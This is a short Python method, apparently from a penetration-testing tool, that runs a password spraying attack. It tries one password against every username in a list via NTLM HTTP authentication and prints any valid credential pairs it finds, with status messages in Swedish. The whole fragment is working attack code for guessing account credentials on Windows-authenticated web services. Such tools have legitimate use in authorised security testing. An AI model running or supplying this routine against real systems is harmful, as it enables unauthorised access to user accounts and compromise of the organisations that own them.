def password_spray(self, password, url):
    print ("[*] Vevar igång lösenordsprayattack med följande lösenord: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Giltigt autentiseringspar hittades! Användarnamn:: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Misslyckades inloggning med användarnamn: " + user)
    print ("[*] Lösenordssprayattack avslutad, " + str(count) + " giltiga autentiseringspar hittades")
